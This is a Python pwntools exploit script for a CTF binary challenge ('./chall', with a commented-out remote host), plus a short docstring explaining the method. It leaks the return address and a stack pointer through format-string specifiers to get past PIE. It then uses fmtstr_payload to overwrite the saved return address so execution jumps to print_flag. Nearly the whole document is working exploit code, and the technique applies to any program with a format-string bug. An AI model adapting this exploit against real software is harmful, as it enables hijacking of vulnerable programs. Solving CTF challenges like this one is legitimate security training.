"""
=== change return address with format string ===
1. rbp is pointing to address(that store return addr)+8
2. write the print_flag func addr in lower bytes and then the high bytes
3. PIE is enabled so have to calculate the base addr, with the return addr leak from format string
"""


from pwn import *
p=process("./chall")
elf = context.binary = ELF('./chall',checksec=False)
# p=remote("ctf.asgama.online", 50001)

p.sendline(b"2")
p.sendline(b"%9$p") # return addr
p.recvuntil("ya ")
alamat=int(p.recvline().decode().strip(), 16)
print(hex(alamat))
elf.address = alamat - int("0x1558",16) #ret addr offset

print_flag=elf.symbols["print_flag"]


p.sendline("3")
p.sendline(b"%19$p") # rbp that store pointer after return addr
p.recvuntil("saranmu: ")
rbp_point_to=int(p.recvline().decode().strip(), 16)-8 #addr of lower bytes of return addr

p.sendline("3")
writes = {rbp_point_to: print_flag}
payload = fmtstr_payload(6, writes)
# pause()
p.sendline(payload)

p.interactive()
